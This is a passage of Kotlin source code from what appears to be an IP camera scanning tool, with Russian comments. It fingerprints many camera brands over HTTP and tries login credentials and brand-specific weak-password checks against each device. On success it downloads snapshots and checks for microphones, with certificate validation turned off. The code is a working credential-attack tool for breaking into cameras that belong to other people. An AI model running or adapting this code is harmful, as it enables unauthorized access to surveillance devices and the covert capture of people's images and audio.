                    "Dahua" -> tryDahuaHttpAuth(ip, port, login, password)
                    "Uniview" -> tryUniviewAuth(ip, port, login, password)
                    "Reolink" -> tryReolinkAuth(ip, port, login, password)
                    "Axis" -> tryAxisAuth(ip, port, login, password)
                    "Vivotek" -> tryVivotekAuth(ip, port, login, password)
                    "Hanwha" -> tryHanwhaAuth(ip, port, login, password)
                    "Bosch" -> tryBoschAuth(ip, port, login, password)
                    "GeoVision" -> tryGeoVisionAuth(ip, port, login, password)
                    "ACTi" -> tryACTiAuth(ip, port, login, password)
                    "Grandstream" -> tryGrandstreamAuth(ip, port, login, password)
                    "Amcrest" -> tryAmcrestAuth(ip, port, login, password)
                    "CPPlus" -> tryCPPlusAuth(ip, port, login, password)
                    "Sony" -> trySonyAuth(ip, port, login, password)
                    "Samsung" -> trySamsungAuth(ip, port, login, password)
                    "Panasonic" -> tryPanasonicAuth(ip, port, login, password)
                    "Intelbras" -> tryIntelbrasAuth(ip, port, login, password)
                    "Herospeed" -> tryHerospeedAuth(ip, port, login, password)
                    "Honeywell" -> tryHoneywellAuth(ip, port, login, password)
                    else -> tryBrandGenericAuth(ip, port, login, password, brand)
                }
                if (authResult != null) return authResult
            } catch (_: Exception) {
                continue
            }
        }

        // ── Ingram brand-specific weak-password checks (no credential loop) ──
        // These use their own auth protocol (base64 endpoint, form POST, XML query)
        val ingramResult = IngramCveChecker.tryBrandWeakPassword(ip, port, brand)
        if (ingramResult != null) return ingramResult

        return null
    }

    // Пути для доп. fingerprint если `/` не дал результат
    private val PROBE_PATHS = listOf(
        "/", "/login.htm", "/login.html", "/doc/page/login.asp",
        "/cgi-bin/snapshot.cgi", "/ISAPI/System/deviceInfo",
        "/cgi-bin/magicBox.cgi?action=getDeviceType",
        "/onvif/device_service", "/web/index.html"
    )

    private fun detectBrand(ip: String, port: Int): String {
        // HTTPS или HTTP в зависимости от порта
        val scheme = if (port in HTTPS_PORTS) "https" else "http"

        // ── Port-specific probe order optimization ────────────────────────────
        // Port 8000: start with ISAPI path (returns 401+Digest header for Hikvision)
        //            and RPC2_Login (returns JSON for Dahua). Generic / may return
        //            binary protocol data that confuses the HTML parser.
        // Port 8089: Dahua web UI — try /RPC2_Login JSON probe first
        val probePaths = when (port) {
            8000 -> listOf(
                "/ISAPI/System/deviceInfo",   // Hikvision ISAPI — 401+Digest or 200+XML
                "/RPC2_Login",                // Dahua — returns JSON even on GET (method not allowed but headers reveal brand)
                "/cgi-bin/magicBox.cgi?action=getDeviceType",
                "/", "/login.htm"
            )
            8089 -> listOf(
                "/RPC2_Login",
                "/",
                "/doc/page/login.asp",
                "/login.htm",
                "/ISAPI/System/deviceInfo"
            )
            8080 -> listOf(
                "/",
                "/login.htm",
                "/doc/page/login.asp",
                "/ISAPI/System/deviceInfo",
                "/RPC2_Login",
                "/cgi-bin/magicBox.cgi?action=getDeviceType"
            )
            else -> PROBE_PATHS
        }

        // Пробуем несколько путей — камеры на 8000/8080/8089 часто не отвечают на /
        for (probePath in probePaths) {
            try {
                val url = URL("$scheme://$ip:$port$probePath")
                val conn = url.openConnection() as HttpURLConnection
                // HTTPS: доверяем самоподписанным сертификатам камер
                if (conn is HttpsURLConnection) {
                    conn.sslSocketFactory = sslContext.socketFactory
                    conn.hostnameVerifier = trustAllHostname
                }
                conn.connectTimeout = TIMEOUT_CONNECT
                conn.readTimeout = TIMEOUT_HTTP
                conn.instanceFollowRedirects = false
                conn.requestMethod = "GET"
                try {
                    conn.connect()
                    val responseCode = conn.responseCode
                    val server = conn.getHeaderField("Server") ?: ""
                    val wwwAuth = conn.getHeaderField("WWW-Authenticate") ?: ""
                    // Redirect Location может содержать бренд
                    val location = conn.getHeaderField("Location") ?: ""
                    val body = try {
                        conn.inputStream.bufferedReader().use { it.readText().take(2000) }
                    } catch (_: Exception) {
                        try {
                            conn.errorStream?.bufferedReader()?.use { it.readText().take(2000) } ?: ""
                        } catch (_: Exception) { "" }
                    }

                    val combined = (server + wwwAuth + body + location).lowercase()
                    val result = matchBrand(combined, responseCode)
                    if (result != "Unknown") return result
                    // На / получили 401 без бренда — это камера, Generic
                    if (probePath == "/" && responseCode == 401) return "Generic"
                    // На / получили redirect — проверяем location
                    if (probePath == "/" && responseCode in 301..308 && location.isNotEmpty()) {
                        // Redirect к login — пробуем этот путь
                        val redirectResult = probeRedirect(ip, port, location)
                        if (redirectResult != "Unknown") return redirectResult
                    }
                } finally {
                    conn.disconnect()
                }
            } catch (_: Exception) {
                continue
            }
        }
        return "Unknown"
    }

    private fun probeRedirect(ip: String, port: Int, location: String): String {
        val path = if (location.startsWith("http")) {
            try { URL(location).path } catch (_: Exception) { location }
        } else location
        val scheme = if (port in HTTPS_PORTS) "https" else "http"
        try {
            val conn = URL("$scheme://$ip:$port$path").openConnection() as HttpURLConnection
            if (conn is HttpsURLConnection) {
                conn.sslSocketFactory = sslContext.socketFactory
                conn.hostnameVerifier = trustAllHostname
            }
            conn.connectTimeout = TIMEOUT_CONNECT
            conn.readTimeout = TIMEOUT_HTTP
            conn.instanceFollowRedirects = false
            conn.requestMethod = "GET"
            try {
                conn.connect()
                val server = conn.getHeaderField("Server") ?: ""
                val wwwAuth = conn.getHeaderField("WWW-Authenticate") ?: ""
                val body = try {
                    conn.inputStream.bufferedReader().use { it.readText().take(2000) }
                } catch (_: Exception) {
                    try { conn.errorStream?.bufferedReader()?.use { it.readText().take(2000) } ?: "" }
                    catch (_: Exception) { "" }
                }
                return matchBrand((server + wwwAuth + body).lowercase(), conn.responseCode)
            } finally {
                conn.disconnect()
            }
        } catch (_: Exception) {
            return "Unknown"
        }
    }

    // ─── Блоклист: НЕ камеры, НЕ терминалы ───
    // Grafana, Jenkins, Tomcat, и прочие web-панели вызывают ложные срабатывания
    private val WEB_PANEL_BLOCKLIST = listOf(
        "grafana", "jenkins", "tomcat", "apache2", "nginx welcome",
        "kibana", "elasticsearch", "prometheus", "zabbix",
        "phpmyadmin", "webmin", "cockpit", "portainer",
        "gitlab", "gitea", "gogs", "sonarqube", "nextcloud",
        "owncloud", "roundcube", "wordpress", "joomla",
        "drupal", "magento", "moodle", "mediawiki",
        "openwrt", "pfsense", "opnsense", "mikrotik",
        "synology", "qnap", "truenas", "freenas",
        "proxmox", "vmware", "vcenter", "esxi",
        "rabbitmq", "redis", "mongodb", "couchdb",
        "hadoop", "spark", "airflow", "superset",
        "traefik", "caddy", "consul", "vault",
        "keycloak", "minio", "harbor", "rancher",
        "kubernetes", "k8s", "docker", "portainer",
        "home assistant", "homeassistant", "hass.io",
        "node-red", "nodered", "mosquitto",
        "pihole", "pi-hole", "adguard",
        "plex", "emby", "jellyfin", "sonarr", "radarr",
        "unifi", "ubiquiti",
        "ic-bezier"  // Grafana font fingerprint
    )

    private fun matchBrand(combined: String, responseCode: Int): String {
        // ═══ АНТИФОЛСПОЗИТИВ: блокируем web-панели ═══
        if (WEB_PANEL_BLOCKLIST.any { it in combined }) return "Unknown"

        return when {
            // Tier 1 — Major brands
            // Hikvision ISAPI on port 8000: WWW-Authenticate: Digest realm="..." + ISAPI path markers
            "hikvision" in combined || "hikdigital" in combined || "webcomponents" in combined
                || "hiwatch" in combined || "isapi" in combined
                || "app-webs" in combined || "dvrdvs-webs" in combined
                || "dnvrs-webs" in combined || "hikvision-webs" in combined
                || "_goaheadwebsessionid" in combined
                || "<devicename>" in combined || "<DeviceInfo" in combined -> "Hikvision"
            // Dahua RPC2 on 8089/8080: JSON response body or X-Requested-With redirect
            "dahua" in combined || "dh-" in combined || "dhweb" in combined
                || "dss" in combined || "smart pss" in combined
                || "rpc2_login" in combined || "rpc2" in combined
                || "global.login" in combined || "dh-nonce" in combined -> "Dahua"
            "dvrdvs" in combined || "xmeye" in combined || "juan" in combined
                || "xm030" in combined || "netsurv" in combined -> "XMeye"
            "uniview" in combined || "unv" in combined || "ezstation" in combined -> "Uniview"
            "reolink" in combined -> "Reolink"
            "foscam" in combined -> "Foscam"
            "axis" in combined || "vapix" in combined -> "Axis"
            // Tier 2 — Chinese brands
            "imou" in combined || "lechange" in combined -> "Imou"
            "tiandy" in combined || "tc-" in combined -> "Tiandy"
            "tvt" in combined || "td-" in combined -> "TVT"
            "tplink" in combined || "tp-link" in combined || "tapo" in combined -> "TPLink"
            "tenda" in combined || "cp3" in combined -> "Tenda"
            "vstarcam" in combined || "eye4" in combined -> "VStarcam"
            "yoosee" in combined || "gwelltimes" in combined || "cloudcam" in combined -> "Yoosee"
            "alisdk" in combined || "alibaba" in combined || "aiot" in combined
                || "linkkit" in combined || "living" in combined || "aliosthings" in combined -> "AliOS"
            "tuya" in combined || "smartlife" in combined -> "Tuya"
            "xiongmai" in combined || "netsurveillance" in combined -> "XMeye"
            // Tier 3 — International brands
            "vivotek" in combined -> "Vivotek"
            "hanwha" in combined || "samsung techwin" in combined || "wisenet" in combined -> "Hanwha"
            "bosch" in combined || "dinion" in combined || "flexidome" in combined -> "Bosch"
            "pelco" in combined || "sarix" in combined -> "Pelco"
            "acti" in combined -> "ACTi"
            "geovision" in combined || "gv-" in combined -> "GeoVision"
            "milesight" in combined -> "Milesight"
            "provision" in combined || "prov-isr" in combined -> "Provision"
            "avtech" in combined -> "Avtech"
            "mobotix" in combined -> "Mobotix"
            "grandstream" in combined -> "Grandstream"
            "wanscam" in combined -> "Wanscam"
            "sricam" in combined -> "Sricam"
            "hiseeu" in combined -> "Hiseeu"
            "annke" in combined -> "Annke"
            "zosi" in combined -> "ZOSI"
            "amcrest" in combined -> "Amcrest"
            "lorex" in combined -> "Lorex"
            "swann" in combined -> "Swann"
            // Tier 4 — Extended brands (from repos)
            "cpplus" in combined || "cp plus" in combined || "cp-plus" in combined -> "CPPlus"
            "sony" in combined || "snc-" in combined -> "Sony"
            "samsung" in combined || "snb-" in combined || "snd-" in combined -> "Samsung"
            "panasonic" in combined || "i-pro" in combined || "wv-" in combined -> "Panasonic"
            "intelbras" in combined || "vip " in combined -> "Intelbras"
            "tvip" in combined || "s-box" in combined -> "TVIP"
            "herospeed" in combined || "longse" in combined || "hsapi" in combined
                || "longseSha256" in combined || "hsdk-player" in combined -> "Herospeed"
            "avigilon" in combined -> "Avigilon"
            "honeywell" in combined || "equip" in combined -> "Honeywell"
            "flir" in combined || "lorex" in combined -> "FLIR"
            "geutebruck" in combined || "geutebrück" in combined -> "Geutebruck"
            // ── Ingram rules.csv additions ──────────────────────────────────────
            // avtech
            "::: login :::" in combined -> "AVTech"
            "remote surveillance" in combined && "any time" in combined -> "AVTech"
            // cctv (JAWS server + body markers)
            "ip surveillance for your life" in combined -> "CCTV"
            "/nobody/logindevice.js" in combined -> "CCTV"
            "server=jaws" in combined || "\njaws" in combined || " jaws/" in combined -> "CCTV"
            // dlink-dcs — realm header
            "realm=\"dcs" in combined || "realm=dcs" in combined -> "DLink-DCS"
            // dvr — generic XML DVR marker from gw.cgi / LOGIN page
            "login" == combined.trim() && responseCode == 200 -> "DVR"
            "rpermission" in combined -> "DVR"
            // instar
            "instar" in combined && "camera" in combined -> "Instar"
            // ipcamera header (IPCamera + 401)
            "ipcamera" in combined && responseCode == 401 -> "IPCamera"
            // netwave
            "netwave ip camera" in combined -> "Netwave"
            // nuuo
            "network video recorder login" in combined -> "NUUO"
            // reecam
            "reecam ip camera" in combined -> "ReeCam"
            // xiongmai (additional to existing XMeye rule above)
            "netsurveillance web" in combined -> "Xiongmai"
            // ── Fallback — generic camera markers ───────────────────────────────
            "ipc" in combined || "nvr" in combined || "camera" in combined
                || "webcam" in combined || "netcam" in combined || "ipcam" in combined
                || "dvr" in combined || "onvif" in combined || "rtsp" in combined
                || "surveillance" in combined || "recorder" in combined || "channel" in combined -> "Generic"
            responseCode == 401 -> "Generic"
            else -> "Unknown"
        }
    }

    private fun tryHikvisionAuth(ip: String, port: Int, login: String, password: String): ScanResult? {
        // Hikvision ISAPI Digest/Basic auth check
        val scheme = if (port in HTTPS_PORTS) "https" else "http"
        val url = URL("$scheme://$ip:$port/ISAPI/System/deviceInfo")
        val conn = url.openConnection() as HttpURLConnection
        if (conn is HttpsURLConnection) {
            conn.sslSocketFactory = sslContext.socketFactory
            conn.hostnameVerifier = HostnameVerifier { _, _ -> true }
        }
        conn.connectTimeout = TIMEOUT_CONNECT
        conn.readTimeout = TIMEOUT_HTTP
        conn.requestMethod = "GET"
        val auth = Base64.encodeToString("$login:$password".toByteArray(), Base64.NO_WRAP)
        conn.setRequestProperty("Authorization", "Basic $auth")
        try {
            conn.connect()
            val code = conn.responseCode
            if (code == 200) {
                val body = conn.inputStream.bufferedReader().use { it.readText().take(4000) }
                val model = extractXmlField(body, "model") ?: extractXmlField(body, "deviceName") ?: "Hikvision"
                val channels = extractXmlField(body, "channelNum")?.toIntOrNull() ?: 1

                val snapshot = getHikvisionSnapshot(ip, port, login, password)
                val mic = checkMicHikvision(ip, port, login, password)
                conn.disconnect()
                return ScanResult(ip, port, login, password, model, channels, snapshot, brand = "Hikvision", hasMic = mic)
            }
            conn.disconnect()
        } catch (_: Exception) {
            conn.disconnect()
        }
        return null
    }

    private fun getHikvisionSnapshot(ip: String, port: Int, login: String, password: String): ByteArray? {
        val paths = listOf(
            "/ISAPI/Streaming/channels/101/picture",
            "/ISAPI/Streaming/channels/1/picture",
            "/Streaming/channels/1/picture",
            "/cgi-bin/snapshot.cgi"
        )
        val auth = Base64.encodeToString("$login:$password".toByteArray(), Base64.NO_WRAP)
        val scheme = if (port in HTTPS_PORTS) "https" else "http"
        for (path in paths) {
            try {
                val url = URL("$scheme://$ip:$port$path")
                val conn = url.openConnection() as HttpURLConnection
                if (conn is HttpsURLConnection) {
                    conn.sslSocketFactory = sslContext.socketFactory
                    conn.hostnameVerifier = HostnameVerifier { _, _ -> true }
                }
                conn.connectTimeout = TIMEOUT_CONNECT
                conn.readTimeout = TIMEOUT_SNAPSHOT
                conn.requestMethod = "GET"
                conn.setRequestProperty("Authorization", "Basic $auth")
                conn.connect()
                if (conn.responseCode == 200) {
                    val contentType = conn.contentType ?: ""
                    if ("image" in contentType || conn.contentLength > 1000) {
                        val data = conn.inputStream.readBytes()
                        conn.disconnect()
                        if (data.size > 100) return data
                    }
                }
                conn.disconnect()
            } catch (_: Exception) {}
        }
        return null
    }

    private fun tryDahuaHttpAuth(ip: String, port: Int, login: String, password: String): ScanResult? {
        // Dahua HTTP CGI auth
        val url = URL("http://$ip:$port/cgi-bin/magicBox.cgi?action=getDeviceType")
        val conn = url.openConnection() as HttpURLConnection
        conn.connectTimeout = TIMEOUT_CONNECT
        conn.readTimeout = TIMEOUT_HTTP
        conn.requestMethod = "GET"
        val auth = Base64.encodeToString("$login:$password".toByteArray(), Base64.NO_WRAP)
        conn.setRequestProperty("Authorization", "Basic $auth")
        try {
            conn.connect()
            if (conn.responseCode == 200) {
                val body = conn.inputStream.bufferedReader().use { it.readText().take(2000) }
                val model = if ("type=" in body) body.substringAfter("type=").trim() else "Dahua"
                val snapshot = getDahuaHttpSnapshot(ip, port, login, password)
                val mic = checkMicDahuaHttp(ip, port, login, password)
                conn.disconnect()
                return ScanResult(ip, port, login, password, model, 1, snapshot, brand = "Dahua-HTTP", hasMic = mic)
            }
            conn.disconnect()
        } catch (_: Exception) {
            conn.disconnect()
        }
        return null
    }

    private fun getDahuaHttpSnapshot(ip: String, port: Int, login: String, password: String): ByteArray? {
        val paths = listOf(
            "/cgi-bin/snapshot.cgi?channel=0",
            "/cgi-bin/snapshot.cgi",
            "/snapshot.jpg"
        )
        val auth = Base64.encodeToString("$login:$password".toByteArray(), Base64.NO_WRAP)
        for (path in paths) {
            try {
                val url = URL("http://$ip:$port$path")
                val conn = url.openConnection() as HttpURLConnection
                conn.connectTimeout = TIMEOUT_CONNECT
                conn.readTimeout = TIMEOUT_SNAPSHOT
                conn.requestMethod = "GET"
                conn.setRequestProperty("Authorization", "Basic $auth")
                conn.connect()
                if (conn.responseCode == 200) {
                    val data = conn.inputStream.readBytes()
                    conn.disconnect()
                    if (data.size > 100) return data
                }
                conn.disconnect()
            } catch (_: Exception) {}
        }
        return null
    }

    private fun tryBasicAuth(ip: String, port: Int, login: String, password: String): ScanResult? {
        // Generic Basic Auth — /cgi-bin/snapshot, /snap.jpg, или просто 200 на /
        val auth = Base64.encodeToString("$login:$password".toByteArray(), Base64.NO_WRAP)

        // Попробуем получить доступ
        val checkPaths = listOf(
            "/cgi-bin/snapshot.cgi",
            "/snap.jpg",
            "/image/jpeg.cgi",
            "/snapshot.jpg",
            "/cgi-bin/hi3510/snap.cgi"
        )

        for (path in checkPaths) {
            if (cancelled) return null
            try {
                val url = URL("http://$ip:$port$path")
                val conn = url.openConnection() as HttpURLConnection
                conn.connectTimeout = TIMEOUT_CONNECT
                conn.readTimeout = TIMEOUT_SNAPSHOT
                conn.requestMethod = "GET"
                conn.setRequestProperty("Authorization", "Basic $auth")
                conn.connect()
                if (conn.responseCode == 200) {
                    val data = conn.inputStream.readBytes()
                    conn.disconnect()
                    if (data.size > 100) {
                        val mic = checkMicGeneric(ip, port, login, password)
                        return ScanResult(ip, port, login, password, "Generic", 1, data, brand = "HTTP", hasMic = mic)
                    }
                }
                conn.disconnect()
            } catch (_: Exception) {}
        }
        return null
    }

    // ─── Uniview Auth (ISAPI-like) ───

    private fun tryUniviewAuth(ip: String, port: Int, login: String, password: String): ScanResult? {
        val auth = Base64.encodeToString("$login:$password".toByteArray(), Base64.NO_WRAP)
        val paths = listOf("/LAPI/V1.0/System/DeviceInfo", "/cgi-bin/main-cgi?json")
        for (path in paths) {
            try {
                val conn = URL("http://$ip:$port$path").openConnection() as HttpURLConnection
                conn.connectTimeout = TIMEOUT_CONNECT
                conn.readTimeout = TIMEOUT_HTTP
                conn.setRequestProperty("Authorization", "Basic $auth")
                conn.connect()
                if (conn.responseCode == 200) {
                    val body = conn.inputStream.bufferedReader().use { it.readText().take(2000) }
                    val model = extractJsonField(body, "DeviceName")
                        ?: extractJsonField(body, "DeviceModel") ?: "Uniview"
                    val snap = getSnapshotGeneric(ip, port, login, password, listOf(
                        "/LAPI/V1.0/Channels/0/Media/Video/Streams/0/LiveFrames",
                        "/cgi-bin/snapshot.cgi", "/snap.jpg"
                    ))
                    conn.disconnect()
                    return ScanResult(ip, port, login, password, model, 1, snap, brand = "Uniview")
                }
                conn.disconnect()
            } catch (_: Exception) {}
        }
        return null
    }

    // ─── Reolink Auth (JSON API) ───

    private fun tryReolinkAuth(ip: String, port: Int, login: String, password: String): ScanResult? {
        try {
            val loginJson = """[{"cmd":"Login","action":0,"param":{"User":{"userName":"$login","password":"$password"}}}]"""
            val conn = URL("http://$ip:$port/cgi-bin/api.cgi?cmd=Login").openConnection() as HttpURLConnection
            conn.connectTimeout = TIMEOUT_CONNECT
            conn.readTimeout = TIMEOUT_HTTP
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "application/json")
            conn.outputStream.write(loginJson.toByteArray())
            conn.outputStream.flush()
            val code = conn.responseCode
            if (code == 200) {
                val body = conn.inputStream.bufferedReader().use { it.readText().take(3000) }
                if ("\"Token\"" in body || "\"token\"" in body) {
                    val token = extractJsonField(body, "name") ?: ""
                    val snap = getReolinkSnapshot(ip, port, token)
                    conn.disconnect()
                    return ScanResult(ip, port, login, password, "Reolink", 1, snap, brand = "Reolink")
                }
            }
            conn.disconnect()
        } catch (_: Exception) {}
        return null
    }

    private fun getReolinkSnapshot(ip: String, port: Int, token: String): ByteArray? {
        try {
            val snapJson = """[{"cmd":"Snap","action":0,"param":{"channel":0}}]"""
            val conn = URL("http://$ip:$port/cgi-bin/api.cgi?cmd=Snap&token=$token").openConnection() as HttpURLConnection
            conn.connectTimeout = TIMEOUT_CONNECT
            conn.readTimeout = TIMEOUT_SNAPSHOT
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "application/json")
            conn.outputStream.write(snapJson.toByteArray())
            conn.connect()
            if (conn.responseCode == 200) {
                val data = conn.inputStream.readBytes()
                conn.disconnect()
                if (data.size > 100) return data
            }
            conn.disconnect()
        } catch (_: Exception) {}
        return null
    }

    // ─── Axis Auth (VAPIX) ───

    private fun tryAxisAuth(ip: String, port: Int, login: String, password: String): ScanResult? {
        val auth = Base64.encodeToString("$login:$password".toByteArray(), Base64.NO_WRAP)
        try {
            val conn = URL("http://$ip:$port/axis-cgi/param.cgi?action=list&group=Brand").openConnection() as HttpURLConnection
            conn.connectTimeout = TIMEOUT_CONNECT
            conn.readTimeout = TIMEOUT_HTTP
            conn.setRequestProperty("Authorization", "Basic $auth")
            conn.connect()
            if (conn.responseCode == 200) {
                val body = conn.inputStream.bufferedReader().use { it.readText().take(2000) }
                val model = if ("ProdShortName=" in body) body.substringAfter("ProdShortName=").substringBefore("\n").trim() else "Axis"
                val snap = getSnapshotGeneric(ip, port, login, password, listOf(
                    "/axis-cgi/jpg/image.cgi", "/jpg/1/image.jpg"
                ))
                conn.disconnect()
                return ScanResult(ip, port, login, password, model, 1, snap, brand = "Axis")
            }
            conn.disconnect()
        } catch (_: Exception) {}
        return null
    }

    // ─── Vivotek Auth (CGI) ───

    private fun tryVivotekAuth(ip: String, port: Int, login: String, password: String): ScanResult? {
        val auth = Base64.encodeToString("$login:$password".toByteArray(), Base64.NO_WRAP)
        try {
            val conn = URL("http://$ip:$port/cgi-bin/viewer/getparam.cgi?system_hostname").openConnection() as HttpURLConnection
            conn.connectTimeout = TIMEOUT_CONNECT
            conn.readTimeout = TIMEOUT_HTTP
            conn.setRequestProperty("Authorization", "Basic $auth")
            conn.connect()
            if (conn.responseCode == 200) {
                val body = conn.inputStream.bufferedReader().use { it.readText().take(1000) }
                val model = if ("hostname=" in body.lowercase()) body.substringAfter("=").substringBefore("\n").trim() else "Vivotek"
                val snap = getSnapshotGeneric(ip, port, login, password, listOf(
                    "/cgi-bin/viewer/video.jpg", "/video.jpg"
                ))
                conn.disconnect()
                return ScanResult(ip, port, login, password, model, 1, snap, brand = "Vivotek")
            }
            conn.disconnect()
        } catch (_: Exception) {}
        return null
    }

    // ─── Hanwha/Samsung (Wisenet) Auth ───

    private fun tryHanwhaAuth(ip: String, port: Int, login: String, password: String): ScanResult? {
        val auth = Base64.encodeToString("$login:$password".toByteArray(), Base64.NO_WRAP)
        try {
            val conn = URL("http://$ip:$port/stw-cgi/system.cgi?msubmenu=deviceinfo&action=view").openConnection() as HttpURLConnection
            conn.connectTimeout = TIMEOUT_CONNECT
            conn.readTimeout = TIMEOUT_HTTP
            conn.setRequestProperty("Authorization", "Basic $auth")
            conn.connect()
            if (conn.responseCode == 200) {
                val body = conn.inputStream.bufferedReader().use { it.readText().take(2000) }
                val model = if ("Model=" in body) body.substringAfter("Model=").substringBefore("\n").trim() else "Hanwha"
                val snap = getSnapshotGeneric(ip, port, login, password, listOf(
                    "/cgi-bin/video.cgi?msubmenu=jpg&resolution=2", "/snapshot.jpg"
                ))
                conn.disconnect()
                return ScanResult(ip, port, login, password, model, 1, snap, brand = "Hanwha")
            }
            conn.disconnect()
        } catch (_: Exception) {}
        return null
    }

    // ─── Bosch Auth (RCP+) ───

    private fun tryBoschAuth(ip: String, port: Int, login: String, password: String): ScanResult? {
        val auth = Base64.encodeToString("$login:$password".toByteArray(), Base64.NO_WRAP)
        try {
            val conn = URL("http://$ip:$port/rcp.xml?command=0x0a01&type=P_OCTET&direction=READ&num=1").openConnection() as HttpURLConnection
            conn.connectTimeout = TIMEOUT_CONNECT
            conn.readTimeout = TIMEOUT_HTTP
            conn.setRequestProperty("Authorization", "Basic $auth")
            conn.connect()
            if (conn.responseCode == 200) {
                val snap = getSnapshotGeneric(ip, port, login, password, listOf(
                    "/snap.jpg", "/cgi-bin/viewer/video.jpg", "/snapshot.jpg"
                ))
                conn.disconnect()
                return ScanResult(ip, port, login, password, "Bosch", 1, snap, brand = "Bosch")
            }
            conn.disconnect()
        } catch (_: Exception) {}
        return null
    }

    // ─── GeoVision Auth ───

    private fun tryGeoVisionAuth(ip: String, port: Int, login: String, password: String): ScanResult? {
        val auth = Base64.encodeToString("$login:$password".toByteArray(), Base64.NO_WRAP)
        try {
            val conn = URL("http://$ip:$port/ssi.cgi/Login.htm").openConnection() as HttpURLConnection
            conn.connectTimeout = TIMEOUT_CONNECT
            conn.readTimeout = TIMEOUT_HTTP
            conn.setRequestProperty("Authorization", "Basic $auth")
            conn.connect()
            if (conn.responseCode == 200) {
                val snap = getSnapshotGeneric(ip, port, login, password, listOf(
                    "/PictureCatch.cgi", "/snap.jpg", "/cgi-bin/snapshot.cgi"
                ))
                conn.disconnect()
                return ScanResult(ip, port, login, password, "GeoVision", 1, snap, brand = "GeoVision")
            }
            conn.disconnect()
        } catch (_: Exception) {}
        return null
    }

    // ─── ACTi Auth ───

    private fun tryACTiAuth(ip: String, port: Int, login: String, password: String): ScanResult? {
        val auth = Base64.encodeToString("$login:$password".toByteArray(), Base64.NO_WRAP)
        try {
            val conn = URL("http://$ip:$port/cgi-bin/system?USER=$login&PWD=$password&SYSTEM_INFO").openConnection() as HttpURLConnection
            conn.connectTimeout = TIMEOUT_CONNECT
            conn.readTimeout = TIMEOUT_HTTP
            conn.connect()
            if (conn.responseCode == 200) {
                val body = conn.inputStream.bufferedReader().use { it.readText().take(2000) }
                if ("ERR" !in body.uppercase()) {
                    val snap = getSnapshotGeneric(ip, port, login, password, listOf(
                        "/cgi-bin/cmd/encoder?SNAPSHOT", "/cgi-bin/snapshot.cgi"
                    ))
                    conn.disconnect()
                    return ScanResult(ip, port, login, password, "ACTi", 1, snap, brand = "ACTi")
                }
            }
            conn.disconnect()
        } catch (_: Exception) {}
        return null
    }

    // ─── Grandstream Auth ───

    private fun tryGrandstreamAuth(ip: String, port: Int, login: String, password: String): ScanResult? {
        val auth = Base64.encodeToString("$login:$password".toByteArray(), Base64.NO_WRAP)
        try {
            val conn = URL("http://$ip:$port/goform/login?username=$login&password=$password").openConnection() as HttpURLConnection
            conn.connectTimeout = TIMEOUT_CONNECT
            conn.readTimeout = TIMEOUT_HTTP
            conn.connect()
            if (conn.responseCode == 200) {
                val body = conn.inputStream.bufferedReader().use { it.readText().take(1000) }
                if ("success" in body.lowercase() || "token" in body.lowercase()) {
                    val snap = getSnapshotGeneric(ip, port, login, password, listOf(
                        "/snapshot/view0.jpg", "/snapshot.jpg"
                    ))
                    conn.disconnect()
                    return ScanResult(ip, port, login, password, "Grandstream", 1, snap, brand = "Grandstream")
                }
            }
            conn.disconnect()
        } catch (_: Exception) {}
        return null
    }

    // ─── Amcrest Auth (Dahua-based) ───

    private fun tryAmcrestAuth(ip: String, port: Int, login: String, password: String): ScanResult? {
        // Amcrest uses Dahua's CGI — but brand it separately
        val auth = Base64.encodeToString("$login:$password".toByteArray(), Base64.NO_WRAP)
        try {
            val conn = URL("http://$ip:$port/cgi-bin/magicBox.cgi?action=getDeviceType").openConnection() as HttpURLConnection
            conn.connectTimeout = TIMEOUT_CONNECT
            conn.readTimeout = TIMEOUT_HTTP
            conn.setRequestProperty("Authorization", "Basic $auth")
            conn.connect()
            if (conn.responseCode == 200) {
                val body = conn.inputStream.bufferedReader().use { it.readText().take(2000) }
                val model = if ("type=" in body) body.substringAfter("type=").trim() else "Amcrest"
                val snap = getSnapshotGeneric(ip, port, login, password, listOf(
                    "/cgi-bin/snapshot.cgi?channel=0", "/cgi-bin/snapshot.cgi", "/snapshot.jpg"
                ))
                conn.disconnect()
                return ScanResult(ip, port, login, password, model, 1, snap, brand = "Amcrest")
            }
            conn.disconnect()
        } catch (_: Exception) {}
        return null
    }

    // ─── CP Plus Auth (Dahua OEM) ───

    private fun tryCPPlusAuth(ip: String, port: Int, login: String, password: String): ScanResult? {
        val auth = Base64.encodeToString("$login:$password".toByteArray(), Base64.NO_WRAP)
        try {
            val conn = URL("http://$ip:$port/cgi-bin/magicBox.cgi?action=getDeviceType").openConnection() as HttpURLConnection
            conn.connectTimeout = TIMEOUT_CONNECT
            conn.readTimeout = TIMEOUT_HTTP
            conn.setRequestProperty("Authorization", "Basic $auth")
            conn.connect()
            if (conn.responseCode == 200) {
                val body = conn.inputStream.bufferedReader().use { it.readText().take(2000) }
                val model = if ("type=" in body) body.substringAfter("type=").trim() else "CP Plus"
                val snap = getSnapshotGeneric(ip, port, login, password, listOf(
                    "/cgi-bin/snapshot.cgi?channel=0", "/cgi-bin/snapshot.cgi", "/snap.jpg"
                ))
                conn.disconnect()
                return ScanResult(ip, port, login, password, model, 1, snap, brand = "CPPlus")
            }
            conn.disconnect()
        } catch (_: Exception) {}
        // Fallback — try ISAPI (some CP Plus use Hikvision firmware)
        try {
            val conn = URL("http://$ip:$port/ISAPI/System/deviceInfo").openConnection() as HttpURLConnection
            conn.connectTimeout = TIMEOUT_CONNECT
            conn.readTimeout = TIMEOUT_HTTP
            conn.setRequestProperty("Authorization", "Basic $auth")
            conn.connect()
            if (conn.responseCode == 200) {
                val body = conn.inputStream.bufferedReader().use { it.readText().take(4000) }
                val model = extractXmlField(body, "model") ?: "CP Plus"
                val snap = getSnapshotGeneric(ip, port, login, password, listOf(
                    "/ISAPI/Streaming/channels/101/picture", "/cgi-bin/snapshot.cgi"
                ))
                conn.disconnect()
                return ScanResult(ip, port, login, password, model, 1, snap, brand = "CPPlus")
            }
            conn.disconnect()
        } catch (_: Exception) {}
        return null
    }

    // ─── Sony Auth ───

    private fun trySonyAuth(ip: String, port: Int, login: String, password: String): ScanResult? {
        val auth = Base64.encodeToString("$login:$password".toByteArray(), Base64.NO_WRAP)
        try {
            val conn = URL("http://$ip:$port/command/inquiry.cgi?inqjs=system").openConnection() as HttpURLConnection
            conn.connectTimeout = TIMEOUT_CONNECT
            conn.readTimeout = TIMEOUT_HTTP
